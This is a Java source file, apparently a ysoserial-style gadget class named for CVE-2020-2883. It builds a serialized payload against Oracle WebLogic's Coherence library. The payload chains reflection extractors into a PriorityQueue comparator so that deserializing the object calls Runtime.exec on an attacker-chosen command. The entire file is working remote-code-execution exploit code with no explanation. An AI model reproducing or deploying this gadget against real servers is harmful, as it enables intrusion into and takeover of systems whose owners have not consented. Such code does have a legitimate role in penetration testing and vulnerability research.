package unserWeblogic.gadgets;

import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.lang.reflect.Field;
import java.util.PriorityQueue;
import ysoserial.payloads.util.Reflections;

public class CVE_2020_2883 implements ObjectPayload<Object>{
    public Object getObject(final String command) throws Exception {
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{command}})
        };
        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors);
        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        Reflections.setFieldValue(queue,"size",2);
        Object[] queueArray = new Object[2];
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";
        Reflections.setFieldValue(queue,"queue",queueArray);
        return queue;
    }
}
